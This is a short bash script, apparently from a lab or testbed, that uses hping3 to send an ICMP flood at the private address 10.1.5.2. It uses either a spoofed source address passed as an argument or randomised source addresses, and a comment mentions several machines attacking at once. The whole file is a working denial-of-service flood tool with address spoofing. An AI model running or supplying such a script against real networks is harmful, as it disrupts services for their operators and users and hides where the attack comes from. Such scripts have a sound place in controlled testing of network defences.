#!/bin/bash

# It works if at least 1 machine is attacking

SPOOF=$1

if [ $# -ge 1 ]
then
    if [ "$1" ]
    then
        echo "START SPOOFED SOURCE"
        sudo hping3 -1 -y --flood -a $SPOOF 10.1.5.2 > /dev/null
    fi
else
    echo "START RANDOM SOURCE"
    sudo hping3 -1 -y --flood --rand-source 10.1.5.2 > /dev/null
fi
